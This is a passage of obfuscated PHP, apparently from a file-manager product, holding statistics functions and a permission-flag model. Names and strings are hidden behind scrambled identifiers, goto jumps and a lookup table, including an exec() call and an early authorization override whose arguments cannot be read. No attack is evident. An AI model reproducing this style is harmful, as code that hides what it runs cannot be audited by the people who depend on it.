strtotime($BÊÕÇÈŸˆÚ))); $AããÊ±‘ƒ = strtotime(date($d‘¶Ìó…ÂŞ[1940], strtotime($BÊÕÇÈŸˆÚ))); goto eÆó™ÆŞ; eÆó™ÆŞ: $cá¶ Ìİ‡ = array($d‘¶Ìó…ÂŞ[184] => array($d‘¶Ìó…ÂŞ[908], $AããÊ±‘ƒ)); $Eˆ«Ïøê‚ë = Model($d‘¶Ìó…ÂŞ[468])->where($cá¶ Ìİ‡)->count($d‘¶Ìó…ÂŞ[1337]); $cá¶ Ìİ‡[$d‘¶Ìó…ÂŞ[184]] = array($d‘¶Ìó…ÂŞ[318], array($BÖ³ÑÒ¶¼¡, $AããÊ±‘ƒ)); goto e—ø‚…Ğö„; Aæ¼“ö¯Ÿ: $aŞ—‹¤ÄÅø = array($d‘¶Ìó…ÂŞ[207] => $BÊÕÇÈŸˆÚ, $d‘¶Ìó…ÂŞ[673] => (int) $Eˆ«Ïøê‚ë, $d‘¶Ìó…ÂŞ[1928] => (int) $aŠò†¨ì¢­, $d‘¶Ìó…ÂŞ[1929] => (int) $F×ğšß½¥…); return $this->insert($aŞ—‹¤ÄÅø); goto A²èø²‹‡¼; A²èø²‹‡¼: } public function _recordStore($e‚‚ˆØì™î = '') { goto FÌÉ“ù„‰Ë; dáÂªêº«Ì: $Bƒ”è‘³˜º = Model($d¬Ÿ³÷ŠÄÌ[417])->where($b†Š‚Æ­¿)->sum($d¬Ÿ³÷ŠÄÌ[78]); $b†Š‚Æ­¿[$d¬Ÿ³÷ŠÄÌ[366]] = 0; $bÕä¾µ¢ºğ = Model($d¬Ÿ³÷ŠÄÌ[735])->where($b†Š‚Æ­¿)->sum($d¬Ÿ³÷ŠÄÌ[78]); goto fœë‡Ø¿¹; Bëé”ÑùĞÊ: $c‘ğĞËæ = Model($d¬Ÿ³÷ŠÄÌ[735])->where($b†Š‚Æ­¿)->sum($d¬Ÿ³÷ŠÄÌ[78]); $A«å¤«¼è• = array($d¬Ÿ³÷ŠÄÌ[207] => $e‚‚ˆØì™î, $d¬Ÿ³÷ŠÄÌ[671] => (int) $bÕä¾µ¢ºğ, $d¬Ÿ³÷ŠÄÌ[1932] => (int) $Bƒ”è‘³˜º, $d¬Ÿ³÷ŠÄÌ[1933] => (int) $AÀÎ…õ¡ëô, $d¬Ÿ³÷ŠÄÌ[1934] => (int) $c‘ğĞËæ); return $this->insert($A«å¤«¼è•); goto fÇßŞ–ÍÈî; FÌÉ“ù„‰Ë: $d¬Ÿ³÷ŠÄÌ =& $_SERVER[‘®…¢À]; $CÃã—„ù»¤ = strtotime(date($d¬Ÿ³÷ŠÄÌ[1940], strtotime($e‚‚ˆØì™î))); $b†Š‚Æ­¿ = array($d¬Ÿ³÷ŠÄÌ[184] => array($d¬Ÿ³÷ŠÄÌ[908], $CÃã—„ù»¤)); goto dáÂªêº«Ì; fœë‡Ø¿¹: $b†Š‚Æ­¿[$d¬Ÿ³÷ŠÄÌ[367]] = 1; $AÀÎ…õ¡ëô = Model($d¬Ÿ³÷ŠÄÌ[735])->where($b†Š‚Æ­¿)->sum($d¬Ÿ³÷ŠÄÌ[78]); $b†Š‚Æ­¿[$d¬Ÿ³÷ŠÄÌ[367]] = 2; goto Bëé”ÑùĞÊ; fÇßŞ–ÍÈî: } public function trend($b¢ËŒóÂ„, $EÉ¡‘ÊÓ ‚) { goto b¡æ™˜½Ï; fèÛáœ„­Ã: return $cÁÙ³æçÎĞ; goto dÏë¿ÔèÀ…; b¡æ™˜½Ï: $f‹ôù­‹òÕ =& $_SERVER[‘®…¢À]; if (!$this->init($b¢ËŒóÂ„)) { return !1; } $cêÉ­äùùÔ = $this->trendList($b¢ËŒóÂ„); goto FÛëÒ¥İå; FÛëÒ¥İå: if ($cêÉ­äùùÔ && $EÉ¡‘ÊÓ ‚ != $f‹ôù­‹òÕ[1312]) { $A‘Ò‚ÙÛ = $cêÉ­äùùÔ[0][$f‹ôù­‹òÕ[207]]; $C¨É›¢ã½ = $this->validDate($EÉ¡‘ÊÓ ‚, $A‘Ò‚ÙÛ); $b„îÒÚƒÊƒ = array(); $eä’†·²ä§ = array_to_keyvalue($cêÉ­äùùÔ, $f‹ôù­‹òÕ[207]); foreach ($C¨É›¢ã½ as $FâĞ´ÖõÄ) { if (isset($eä’†·²ä§[$FâĞ´ÖõÄ])) { $FÅĞË™éËñ = $eä’†·²ä§[$FâĞ´ÖõÄ]; } else { $FÅĞË™éËñ = end($cêÉ­äùùÔ); $FÅĞË™éËñ[$f‹ôù­‹òÕ[207]] = $FâĞ´ÖõÄ; if ($b¢ËŒóÂ„ == $f‹ôù­‹òÕ[526]) { $FÅĞË™éËñ[$f‹ôù­‹òÕ[1928]] = $FÅĞË™éËñ[$f‹ôù­‹òÕ[1929]] = 0; } } $b„îÒÚƒÊƒ[] = $FÅĞË™éËñ; } $cêÉ­äùùÔ = $b„îÒÚƒÊƒ; } $B§å¤Ÿëà¶ = array($f‹ôù­‹òÕ[526] => array($f‹ôù­‹òÕ[673] => LNG($f‹ôù­‹òÕ[1944]), $f‹ôù­‹òÕ[1928] => LNG($f‹ôù­‹òÕ[1945]), $f‹ôù­‹òÕ[1929] => LNG($f‹ôù­‹òÕ[1946])), $f‹ôù­‹òÕ[1930] => array($f‹ôù­‹òÕ[671] => LNG($f‹ôù­‹òÕ[1947]), $f‹ôù­‹òÕ[1932] => LNG($f‹ôù­‹òÕ[1948]), $f‹ôù­‹òÕ[1933] => LNG($f‹ôù­‹òÕ[1949]), $f‹ôù­‹òÕ[1934] => LNG($f‹ôù­‹òÕ[1950]))); $c¾Õ á« = array($f‹ôù­‹òÕ[526] => $f‹ôù­‹òÕ[1951], $f‹ôù­‹òÕ[1930] => $f‹ôù­‹òÕ[78]); goto c´‚¯›ÂÉÑ; c´‚¯›ÂÉÑ: if (empty($cêÉ­äùùÔ)) { $FâĞ´ÖõÄ = date($f‹ôù­‹òÕ[1935], strtotime($f‹ôù­‹òÕ[1936])); $dÍ–ØÔÏ– = array($f‹ôù­‹òÕ[207] => $FâĞ´ÖõÄ); foreach ($B§å¤Ÿëà¶[$b¢ËŒóÂ„] as $C¶Áö¹îäÖ => $Cò´Â¶øï) { $dÍ–ØÔÏ–[$C¶Áö¹îäÖ] = 0; } $cêÉ­äùùÔ[] = $dÍ–ØÔÏ–; } $cÁÙ³æçÎĞ = array(); foreach ($cêÉ­äùùÔ as $Cò´Â¶øï) { if ($b¢ËŒóÂ„ == $f‹ôù­‹òÕ[1930] && $Cò´Â¶øï[$f‹ôù­‹òÕ[1932]] > $Cò´Â¶øï[$f‹ôù­‹òÕ[671]]) { $Cò´Â¶øï[$f‹ôù­‹òÕ[1932]] = $Cò´Â¶øï[$f‹ôù­‹òÕ[671]]; } foreach ($B§å¤Ÿëà¶[$b¢ËŒóÂ„] as $C¶Áö¹îäÖ => $Dº¯è†çĞ’) { $FÅĞË™éËñ = array($f‹ôù­‹òÕ[207] => $Cò´Â¶øï[$f‹ôù­‹òÕ[207]], $f‹ôù­‹òÕ[1234] => $Dº¯è†çĞ’); $FÅĞË™éËñ[$c¾Õ á«[$b¢ËŒóÂ„]] = isset($Cò´Â¶øï[$C¶Áö¹îäÖ]) ? $Cò´Â¶øï[$C¶Áö¹îäÖ] : 0; $cÁÙ³æçÎĞ[] = $FÅĞË™éËñ; } } goto fèÛáœ„­Ã; dÏë¿ÔèÀ…: } public function validDate($aç¼×òÊô, $f†×øøõ½ˆ) { goto C®å·øŒ£‰; C®å·øŒ£‰: $Açí’¶ÙÕß =& $_SERVER[‘®…¢À]; $D»šêÕ¦‘ = date($Açí’¶ÙÕß[1935], strtotime($Açí’¶ÙÕß[1936])); $cíå’©¦ƒ = array($D»šêÕ¦‘); goto d¤×òËŒá; d¤×òËŒá: switch ($aç¼×òÊô) { case $Açí’¶ÙÕß[1319]: $dĞÎ½ï‹ = mktime(0, 0, 0, date($Açí’¶ÙÕß[1952]), date($Açí’¶ÙÕß[1953]) - date($Açí’¶ÙÕß[1176]) + 7 - 7, date($Açí’¶ÙÕß[1954])); $b®Å¼İ“Ò» = 0; do { $eÏ±’­¶” = date($Açí’¶ÙÕß[1935], $dĞÎ½ï‹ - 3600 * 24 * 7 * $b®Å¼İ“Ò»); $cíå’©¦ƒ[] = $eÏ±’­¶”; $b®Å¼İ“Ò»++; } while ($f†×øøõ½ˆ < $eÏ±’­¶”); break; case $Açí’¶ÙÕß[1317]: $b®Å¼İ“Ò» = 1; do { $cÖš´Ê¯ô‰ = date($Açí’¶ÙÕß[1955], strtotime("\55\40{$b®Å¼İ“Ò»}\x20\x6d\157\156\x74\x68\x73")); $cíå’©¦ƒ[] = $cÖš´Ê¯ô‰; $b®Å¼İ“Ò»++; } while ($f†×øøõ½ˆ < $cÖš´Ê¯ô‰); break; case $Açí’¶ÙÕß[1620]: $D‡š„˜§Š = (int) date($Açí’¶ÙÕß[1954], strtotime($f†×øøõ½ˆ)); $A±’°Ö×¹´ = (int) date($Açí’¶ÙÕß[1954]); if ($D‡š„˜§Š >= $A±’°Ö×¹´) { break; } for ($D‡š„˜§Š; $D‡š„˜§Š < $A±’°Ö×¹´; $D‡š„˜§Š++) { $cíå’©¦ƒ[] = $D‡š„˜§Š . $Açí’¶ÙÕß[1956]; } break; default: break; } if ($f†×øøõ½ˆ > end($cíå’©¦ƒ)) { array_pop($cíå’©¦ƒ); } sort($cíå’©¦ƒ); goto aÂöìäËÆò; aÂöìäËÆò: return $cíå’©¦ƒ; goto e´çèä°‚; e´çèä°‚: } public function listTable($F½êÎ¡Ñ…˜) { $E”Á°»Äá = ucfirst($F½êÎ¡Ñ…˜); return Model($E”Á°»Äá)->listData(); } public function option($c¹”éµÛ¼) { $A®¼è³‹„è = $_SERVER[‘®…¢À][1957] . ucfirst($c¹”éµÛ¼); return $this->{$A®¼è³‹„è}(); } private function optionUser() { goto C‹—î§ï²¨; C‹—î§ï²¨: $C´®ˆª®‘Ä =& $_SERVER[‘®…¢À]; $B½ÏÍõƒŞ‰ = Model($C´®ˆª®‘Ä[468])->count($C´®ˆª®‘Ä[1337]); $a„‘Õí´ä = Model($C´®ˆª®‘Ä[468])->where($C´®ˆª®‘Ä[1958])->count($C´®ˆª®‘Ä[1337]); goto c¯Ì‹§®‰•; cÌÈ’õĞÁœ: if (!$bÊÍ¶±ö§á) { $bÊÍ¶±ö§á = 1; } $e¢ŞœÃë‘ï = strtotime(date($C´®ˆª®‘Ä[1939])); $cßè›Â‚â = array($C´®ˆª®‘Ä[1960] => array($C´®ˆª®‘Ä[909], $e¢ŞœÃë‘ï)); goto C¿“—Ã«Ú; C¿“—Ã«Ú: $a·ÇŠÎæÚ˜ = Model($C´®ˆª®‘Ä[468])->where($cßè›Â‚â)->count($C´®ˆª®‘Ä[1337]); return array($C´®ˆª®‘Ä[668] => (int) $B½ÏÍõƒŞ‰, $C´®ˆª®‘Ä[1961] => (int) ($B½ÏÍõƒŞ‰ - $a„‘Õí´ä), $C´®ˆª®‘Ä[1962] => (int) $a„‘Õí´ä, $C´®ˆª®‘Ä[1963] => (int) $a·ÇŠÎæÚ˜, $C´®ˆª®‘Ä[1964] => $bÊÍ¶±ö§á); goto Bæì°¯Ÿ‘µ; c¯Ì‹§®‰•: $e¢ŞœÃë‘ï = strtotime($C´®ˆª®‘Ä[1959]); $cßè›Â‚â = array($C´®ˆª®‘Ä[1960] => array($C´®ˆª®‘Ä[909], $e¢ŞœÃë‘ï)); $bÊÍ¶±ö§á = (int) Model($C´®ˆª®‘Ä[468])->where($cßè›Â‚â)->count($C´®ˆª®‘Ä[1337]); goto cÌÈ’õĞÁœ; Bæì°¯Ÿ‘µ: } private function optionFile() { goto eî©Ë ‚«Ñ; eî©Ë ‚«Ñ: $aÀŠÑ‘“°• =& $_SERVER[‘®…¢À]; $Bì‹‚î¶–” = $this->sourceSize(); $A«´Œ§®ò‡ = $Bì‹‚î¶–”[$aÀŠÑ‘“°•[78]]; goto e‚–ˆø÷·õ; e‚–ˆø÷·õ: $AğÓñµùŞê = $Bì‹‚î¶–”[$aÀŠÑ‘“°•[1932]]; $fÂ‘‚ùÈ‘ƒ = Model($aÀŠÑ‘“°•[735])->where(array($aÀŠÑ‘“°•[366] => 0))->count($aÀŠÑ‘“°•[365]); $bãĞíƒ¿ = array($aÀŠÑ‘“°•[366] => 0, $aÀŠÑ‘“°•[184] => array($aÀŠÑ‘“°•[909], strtotime(date($aÀŠÑ‘“°•[1939])))); goto CÛ™±ä³Óì; CÛ™±ä³Óì: $d›Ô”­ = Model($aÀŠÑ‘“°•[735])->where($bãĞíƒ¿)->sum($aÀŠÑ‘“°•[78]); $aœ‰×ÔœŠ¯ = Model($aÀŠÑ‘“°•[735])->where($bãĞíƒ¿)->count($aÀŠÑ‘“°•[365]); return array($aÀŠÑ‘“°•[671] => $A«´Œ§®ò‡, $aÀŠÑ‘“°•[1932] => $AğÓñµùŞê, $aÀŠÑ‘“°•[1965] => $A«´Œ§®ò‡ - $AğÓñµùŞê, $aÀŠÑ‘“°•[1966] => (int) $d›Ô”­, $aÀŠÑ‘“°•[673] => (int) $fÂ‘‚ùÈ‘ƒ, $aÀŠÑ‘“°•[1967] => (int) $aœ‰×ÔœŠ¯); goto fãˆ†°¿½Ñ; fãˆ†°¿½Ñ: } private function optionAccess() { $d”Éï§çÌ =& $_SERVER[‘®…¢À]; return array($d”Éï§çÌ[668] => $this->typeLogCnt(), $d”Éï§çÌ[92] => $this->typeLogCnt($d”Éï§çÌ[92]), $d”Éï§çÌ[399] => $this->typeLogCnt($d”Éï§çÌ[399]), $d”Éï§çÌ[1968] => $this->typeLogCnt($d”Éï§çÌ[1968]), $d”Éï§çÌ[1969] => $this->typeLogCnt($d”Éï§çÌ[1969]), $d”Éï§çÌ[526] => $this->typeLogCnt($d”Éï§çÌ[33], $d”Éï§çÌ[1943])); } private function typeLogCnt($cË¨ÃÅ­† = '', $B…³Ã¹ïÅÂ = "\151\144") { goto a­à¸£«»™; FÀ÷°Å³ãÁ: return (int) $Cª—Ãªâ; goto fÃ”ëÆÏ¿; CªÌ•¼¸£’: $AóùñÒŒÌ = array($AÍ†ŠÉ÷ƒ[184] => array($AÍ†ŠÉ÷ƒ[909], $C½‚š«§™‹)); if ($cË¨ÃÅ­†) { $AóùñÒŒÌ[$AÍ†ŠÉ÷ƒ[29]] = array($AÍ†ŠÉ÷ƒ[7], $fÚ¸´¾Ÿœ[$cË¨ÃÅ­†]); } $Cª—Ãªâ = Model($AÍ†ŠÉ÷ƒ[1942])->where($AóùñÒŒÌ)->count($B…³Ã¹ïÅÂ); goto FÀ÷°Å³ãÁ; a­à¸£«»™: $AÍ†ŠÉ÷ƒ =& $_SERVER[‘®…¢À]; $fÚ¸´¾Ÿœ = array($AÍ†ŠÉ÷ƒ[92] => array($AÍ†ŠÉ÷ƒ[1970], $AÍ†ŠÉ÷ƒ[1971]), $AÍ†ŠÉ÷ƒ[399] => array($AÍ†ŠÉ÷ƒ[1972]), $AÍ†ŠÉ÷ƒ[1968] => array($AÍ†ŠÉ÷ƒ[1973], $AÍ†ŠÉ÷ƒ[1974]), $AÍ†ŠÉ÷ƒ[1969] => array($AÍ†ŠÉ÷ƒ[1975], $AÍ†ŠÉ÷ƒ[1976]), $AÍ†ŠÉ÷ƒ[1977] => array($AÍ†ŠÉ÷ƒ[1978], $AÍ†ŠÉ÷ƒ[1979], $AÍ†ŠÉ÷ƒ[1980])); $C½‚š«§™‹ = strtotime(date($AÍ†ŠÉ÷ƒ[1939])); goto CªÌ•¼¸£’; fÃ”ëÆÏ¿: } private function optionServer() { goto c®Œ†îë’ø; c®Œ†îë’ø: $B”ĞÛÌîÅ =& $_SERVER[‘®…¢À]; $Bµ¦°‹ßŠƒ = $this->diskDriver(); $c”„¸÷á‘¢ = KodIO::defaultDriver(); goto aŒ¬ğ‘ÀƒÇ; eŒ–ÃŸ‹: $eªéöäÇ½ª = $FÔù¨“×ÔÑ[0]; $bÁô¨ñƒ‚ª = $GLOBALS[$B”ĞÛÌîÅ[6]][$B”ĞÛÌîÅ[17]]; $F¦¦‰„Â = $bÁô¨ñƒ‚ª[$B”ĞÛÌîÅ[706]]; goto CÄ»Éèƒ…; aŒ¬ğ‘ÀƒÇ: $b•âá–Ö²î = array($B”ĞÛÌîÅ[696] => $c”„¸÷á‘¢[$B”ĞÛÌîÅ[363]]); $AÇÌôˆµÁõ = Model($B”ĞÛÌîÅ[417])->where($b•âá–Ö²î)->sum($B”ĞÛÌîÅ[78]); $FÔù¨“×ÔÑ = explode($B”ĞÛÌîÅ[50], $_SERVER[$B”ĞÛÌîÅ[138]]); goto eŒ–ÃŸ‹; B‘¥†æ‘«Ğ: return array($B”ĞÛÌîÅ[1983] => $Bµ¦°‹ßŠƒ ? $Bµ¦°‹ßŠƒ[$B”ĞÛÌîÅ[1984]] : 0, $B”ĞÛÌîÅ[1985] => $Bµ¦°‹ßŠƒ ? $Bµ¦°‹ßŠƒ[$B”ĞÛÌîÅ[1986]] : 0, $B”ĞÛÌîÅ[1987] => (int) $c”„¸÷á‘¢[$B”ĞÛÌîÅ[1984]] * 1024 * 1024 * 1024, $B”ĞÛÌîÅ[1988] => (int) $AÇÌôˆµÁõ, $B”ĞÛÌîÅ[1989] => ucfirst($eªéöäÇ½ª), $B”ĞÛÌîÅ[1990] => $B”ĞÛÌîÅ[1991] . PHP_VERSION, $B”ĞÛÌîÅ[1992] => phpBuild64() ? 64 : 32, $B”ĞÛÌîÅ[667] => str_replace($B”ĞÛÌîÅ[1993], $B”ĞÛÌîÅ[885], $F¦¦‰„Â), $B”ĞÛÌîÅ[334] => ucfirst($B»…æáÆ•Ã), $B”ĞÛÌîÅ[28] => $_SERVER[$B”ĞÛÌîÅ[1994]]); goto f˜ã¥áŠïŞ; CÄ»Éèƒ…: if ($F¦¦‰„Â == $B”ĞÛÌîÅ[707]) { $dŞçó¾èì = explode($B”ĞÛÌîÅ[708], $bÁô¨ñƒ‚ª[$B”ĞÛÌîÅ[709]]); $F¦¦‰„Â = $dŞçó¾èì[0]; } if ($F¦¦‰„Â == $B”ĞÛÌîÅ[805] || $F¦¦‰„Â == $B”ĞÛÌîÅ[689]) { $f´ÁĞ«¨¼Œ = Model()->db()->query($B”ĞÛÌîÅ[1981]); $e¡âŒ–´„ñ = $f´ÁĞ«¨¼Œ[0] && isset($f´ÁĞ«¨¼Œ[0][$B”ĞÛÌîÅ[1233]]) ? $f´ÁĞ«¨¼Œ[0][$B”ĞÛÌîÅ[1233]] : 0; $F¦¦‰„Â = $B”ĞÛÌîÅ[1982] . ($e¡âŒ–´„ñ ? $B”ĞÛÌîÅ[8] . $e¡âŒ–´„ñ : $B”ĞÛÌîÅ[33]); } $B»…æáÆ•Ã = $GLOBALS[$B”ĞÛÌîÅ[6]][$B”ĞÛÌîÅ[334]][$B”ĞÛÌîÅ[736]]; goto B‘¥†æ‘«Ğ; f˜ã¥áŠïŞ: } private function diskDriver() { goto Bšƒ‡ˆŠ¤ö; B‘­¡ÔˆÚœ: if ($fÊ½†ŒÅµŒ) { $d¡ñÅ°§ï¶ = $a×³Ğá·Î‡[1997]; if (function_exists($a×³Ğá·Î‡[1998])) { exec($a×³Ğá·Î‡[1999], $F–ã‘«¯¾); $d¡ñÅ°§ï¶ = $F–ã‘«¯¾[1] . $a×³Ğá·Î‡[8]; } } if (!file_exists($d¡ñÅ°§ï¶)) { return; } $F«ŠĞù‹—­ = @disk_total_space($d¡ñÅ°§ï¶); goto DïªÅ«¸“Ò; Bšƒ‡ˆŠ¤ö: $a×³Ğá·Î‡ =& $_SERVER[‘®…¢À]; $d¡ñÅ°§ï¶ = $a×³Ğá·Î‡[8]; $fÊ½†ŒÅµŒ = $GLOBALS[$a×³Ğá·Î‡[6]][$a×³Ğá·Î‡[1995]] == $a×³Ğá·Î‡[1996]; goto B‘­¡ÔˆÚœ; DïªÅ«¸“Ò: $eÀó–öÊ“é = $F«ŠĞù‹—­ - @disk_free_space($d¡ñÅ°§ï¶); return array($a×³Ğá·Î‡[1984] => $F«ŠĞù‹—­, $a×³Ğá·Î‡[1986] => $eÀó–öÊ“é); goto aİÔ­ãî‘–; aİÔ­ãî‘–: } public function fileChart($A–ÓŠĞÃÛ) { goto A×Š‹Â©Ç; A×Š‹Â©Ç: $a©íÂŒî˜Ê =& $_SERVER[‘®…¢À]; if (isset($A–ÓŠĞÃÛ[$a©íÂŒî˜Ê[1337]])) { return Model($a©íÂŒî˜Ê[735])->userFileTypeProfile($A–ÓŠĞÃÛ[$a©íÂŒî˜Ê[1337]]); } if (isset($A–ÓŠĞÃÛ[$a©íÂŒî˜Ê[2000]])) { return Model($a©íÂŒî˜Ê[735])->groupFileTypeProfile($A–ÓŠĞÃÛ[$a©íÂŒî˜Ê[2000]]); } goto aˆ¯øä‚¬¸; aˆ¯øä‚¬¸: $aàÊÍî¶ƒ‡ = $this->sourceSize(); $dö•¾’ÃÓ = array($a©íÂŒî˜Ê[456] => 0, $a©íÂŒî˜Ê[367] => 1); $Fá…°½®¼ = Model($a©íÂŒî˜Ê[735])->where($dö•¾’ÃÓ)->sum($a©íÂŒî˜Ê[78]); goto b—®¸®—Û‚; b—®¸®—Û‚: $dö•¾’ÃÓ[$a©íÂŒî˜Ê[367]] = 2; $CŞ…¸½îóÖ = Model($a©íÂŒî˜Ê[735])->where($dö•¾’ÃÓ)->sum($a©íÂŒî˜Ê[78]); return array($a©íÂŒî˜Ê[671] => $aàÊÍî¶ƒ‡[$a©íÂŒî˜Ê[78]], $a©íÂŒî˜Ê[1932] => $aàÊÍî¶ƒ‡[$a©íÂŒî˜Ê[1932]], $a©íÂŒî˜Ê[1933] => (int) $Fá…°½®¼, $a©íÂŒî˜Ê[1934] => (int) $CŞ…¸½îóÖ); goto EÈÀ¨ÕÓÍÙ; EÈÀ¨ÕÓÍÙ: } private function sourceSize() { $f„¿¢œÄ =& $_SERVER[‘®…¢À]; $AáíáÇÔÜÒ = Model($f„¿¢œÄ[735])->where(array($f„¿¢œÄ[366] => 0))->sum($f„¿¢œÄ[78]); $b››‰œ„ñÓ = Model($f„¿¢œÄ[417])->sum($f„¿¢œÄ[78]); if ($b››‰œ„ñÓ > $AáíáÇÔÜÒ) { $b››‰œ„ñÓ = $AáíáÇÔÜÒ; } return array($f„¿¢œÄ[78] => (int) $AáíáÇÔÜÒ, $f„¿¢œÄ[1932] => (int) $b››‰œ„ñÓ); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $dïĞá×ÁÆ =& $_SERVER[‘®…¢À]; $e“ŠÙëÀî† = array(array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2001]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2003], $dïĞá×ÁÆ[2004] => 6, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2007]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2008], $dïĞá×ÁÆ[2004] => 1, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2009]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2010], $dïĞá×ÁÆ[2004] => 2, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2011]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2010], $dïĞá×ÁÆ[2004] => 3, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2012]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2013], $dïĞá×ÁÆ[2004] => 4, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_VIEW), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2014]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2015], $dïĞá×ÁÆ[2004] => 5, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($dïĞá×ÁÆ[382] => LNG($dïĞá×ÁÆ[2016]), $dïĞá×ÁÆ[2002] => $dïĞá×ÁÆ[2017], $dïĞá×ÁÆ[2004] => 7, $dïĞá×ÁÆ[2005] => 1, $dïĞá×ÁÆ[2006] => 0)); return $e“ŠÙëÀî†; } public static function authCheck($FßŠ‰ø‡Ô³, $cë¥ïˆù) { $FßŠ‰ø‡Ô³ = intval($FßŠ‰ø‡Ô³); if (_get($GLOBALS, $_SERVER[‘®…¢À][452])) { return !0; } if ($FßŠ‰ø‡Ô³ <= 0) { return !1; } if (($FßŠ‰ø‡Ô³ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($FßŠ‰ø‡Ô³ & $cë¥ïˆù); } public static function authCheckShow($f¦ÓÍ¶‰ˆ) { return self::authCheck($f¦ÓÍ¶‰ˆ, self::AUTH_SHOW); } public static function authCheckView($cÜœ¦ÙÁÒ„) { return self::authCheck($cÜœ¦ÙÁÒ„, self::AUTH_VIEW); } public static function authCheckDownload($f‹¼­–’ÚÀ) { return self::authCheck($f‹¼­–’ÚÀ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eäŞ®ƒÊ¼) { return self::authCheck($eäŞ®ƒÊ¼, self::AUTH_UPLOAD); } public static function authCheckEdit($B”­×‘¶­œ) { return self::authCheck($B”­×‘¶­œ, self::AUTH_EDIT); } public static function authCheckRemove($CÜÄÄº­ìÙ) { return self::authCheck($CÜÄÄº­ìÙ, self::AUTH_REMOVE); } public static function authCheckShare($E™áÏ¶ÀŞ) { return self::authCheck($E™áÏ¶ÀŞ, self::AUTH_SHARE); } public static function authCheckComment($C—¹Š‹ó‡) { return self::authCheck($C—¹Š‹ó‡, self::AUTH_COMMENT); } public static function authCheckEvent($bë‘²ÉÅÚË) { return self::authCheck($bë‘²ÉÅÚË, self::AUTH_EVENT); } public static function authCheckRoot($AøĞ­Ÿ·‘™) { return self::authCheck($AøĞ­Ÿ·‘™, self::AUTH_ROOT); } public static function authDisable($DŸ×†ƒ¥Ş, $bÅ‘¸Ğê¤) { if (intval($DŸ×†ƒ¥Ş) <= 0) { return 0; } return intval($DŸ×†ƒ¥Ş) & ~$bÅ‘¸Ğê¤; } public $optionType = "\123\171\x73\164\145\x6d\x2e\x73\157\x75\x72\143\145\x41\x75\164\150\114\x69\x73\x74"; public $field = array("\156\141\155\145", "\x61\165\164\x68", "\154\141\142\145\154", "\144\151\x73\x70\154\141\x79", "\163\171\x73\x74\145\x6d", "\x73\x6f\162\x74"); public function initData() { $b‘àÃ·ˆŞ = $this->authDefault(); foreach ($b‘àÃ·ˆŞ as $bˆ³»ä°Ç) { $this->add($bˆ³»ä°Ç); } } public function listData($Aª«¶”‡É = false, $Céç©ËÔŸÆ = "\163\x6f\162\x74", $eÏ±´ìŠ¿‡ = false) { return parent::listData($Aª«¶”‡É, $Céç©ËÔŸÆ, $eÏ±´ìŠ¿‡); } public function update($BÊ¢åÉÉ…ì, $cÆ‡¼ª¢Ú) { $e÷ö‚«ò¹œ =& $_SERVER[‘®…¢À]; $CÖŸØŠ„× = parent::listData($BÊ¢åÉÉ…ì); $E˜‹ßÅ½¿ = $this->findByName($cÆ‡¼ª¢Ú[$e÷ö‚«ò¹œ[28]]); if (!$CÖŸØŠ„× || $E˜‹ßÅ½¿ && $E˜‹ßÅ½¿[$e÷ö‚«ò¹œ[363]] != $CÖŸØŠ„×[$e÷ö‚«ò¹œ[363]]) { return !1; } $this->filterAuth($cÆ‡¼ª¢Ú[$e÷ö‚«ò¹œ[372]]); return parent::update($BÊ¢åÉÉ…ì, $cÆ‡¼ª¢Ú); } public function remove($dĞ«ëíÈ¢) { $cÁŒ¨‹™ˆ = parent::listData($dĞ«ëíÈ¢); if (!$cÁŒ¨‹™ˆ || $cÁŒ¨‹™ˆ[$_SERVER[‘®…¢À][1037]]) { return !1; } return parent::remove($dĞ«ëíÈ¢); } public function add($d»½˜‰ö§ = array()) { goto cË¼¯¿¹ºØ; E´¡»”ª¯Ù: $d»½˜‰ö§ = array_merge($Cö”ÇÂØ“‹, $d»½˜‰ö§); $d»½˜‰ö§[$cáŞ¶ê×¢Ô[2021]] = $this->getSort(); $this->filterAuth($d»½˜‰ö§[$cáŞ¶ê×¢Ô[372]]); goto bÍë¯“ğÏß; bÍë¯“ğÏß: return 